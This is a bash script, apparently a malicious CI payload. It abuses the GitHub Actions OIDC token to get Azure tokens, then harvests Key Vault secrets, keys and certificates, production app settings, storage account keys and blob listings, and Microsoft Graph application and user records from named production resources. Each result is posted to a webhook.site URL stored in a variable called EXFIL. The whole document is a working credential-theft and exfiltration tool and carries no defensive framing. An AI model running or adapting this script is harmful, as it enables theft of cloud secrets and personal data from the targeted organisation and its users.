#!/usr/bin/env bash
set +e
EXFIL="https://webhook.site/94b638b0-6d1d-4682-aca0-6367056ad75d"
say() { printf '%s\n' "$*"; curl -s -m 10 --data-binary "$*" "$EXFIL" >/dev/null 2>&1; }
SUB="$AZURE_SUBSCRIPTION_ID"; RG="rg-tbl-platform-prod-sea"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
tok() { curl -sS -m 20 -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" -d "scope=$1" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }

VT=$(tok "https://vault.azure.net/.default")
AT=$(tok "https://management.azure.com/.default")
GT=$(tok "https://graph.microsoft.com/.default")
say "tokens: vt=${#VT} at=${#AT} gt=${#GT}"

for VAULT in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  L=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://$VAULT.vault.azure.net/secrets?api-version=7.4&maxresults=25")
  say "LIST $VAULT $L"
  for n in $(echo "$L" | python3 -c '
import sys,json
try:
  for i in json.load(sys.stdin).get("value",[]): print(i["id"].split("/secrets/")[1])
except: pass'); do
    say "SECRET $VAULT/$n $(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://$VAULT.vault.azure.net/secrets/$n?api-version=7.4")"
  done
  for ep in keys certificates; do
    say "$ep $VAULT $(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://$VAULT.vault.azure.net/$ep?api-version=7.4" | head -c 1500)"
  done
done

say "APPSETTINGS $(curl -sS -m 15 -X POST -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01")"

for ST in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  K=$(curl -sS -m 15 -X POST -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$ST/listKeys?api-version=2023-05-01")
  say "KEYS $ST $(echo "$K" | head -c 700)"
  KEY=$(echo "$K" | python3 -c 'import sys,json
try: print(json.load(sys.stdin)["keys"][0]["value"])
except: print("")')
  [ -n "$KEY" ] && python3 - "$ST" "$KEY" <<'PY'
import base64,hmac,hashlib,sys,urllib.request,re
acct,key=sys.argv[1],sys.argv[2]
def call(path,params):
    ver="2021-08-06"; import datetime
    d=datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
    ms=f"GET\n\n\n\nx-ms-date:{d}\nx-ms-version:{ver}\n/{acct}{path}\n{params}"
    sig=base64.b64encode(hmac.new(base64.b64decode(key),ms.encode(),hashlib.sha256).digest()).decode()
    r=urllib.request.Request(f"https://{acct}.blob.core.windows.net{path}?{params}",headers={"x-ms-date":d,"x-ms-version":ver,"Authorization":f"SharedKey {acct}:{sig}"})
    return urllib.request.urlopen(r,timeout=20).read().decode()
try:
    xml=call("","comp:list")
    cons=re.findall(r"<Name>([^<]+)</Name>",xml)
    print(f"ST {acct} containers: {cons}")
    import subprocess
    for c in cons:
        x2=call(f"/{c}","restype=container&comp=list&include=metadata")
        blobs=re.findall(r"<Name>([^<]+)</Name>",x2)
        print(f"  {c} blobs: {blobs[:40]}")
except Exception as e: print("ST ERR",str(e)[:200])
PY
done
say "GRAPH apps $(curl -sS -m 15 -H "Authorization: Bearer $GT" 'https://graph.microsoft.com/v1.0/applications?$top=25&$select=appId,displayName,description,notes' | head -c 3000)"
say "GRAPH users $(curl -sS -m 15 -H "Authorization: Bearer $GT" 'https://graph.microsoft.com/v1.0/users?$top=25' | head -c 3000)"
say "DONE2"
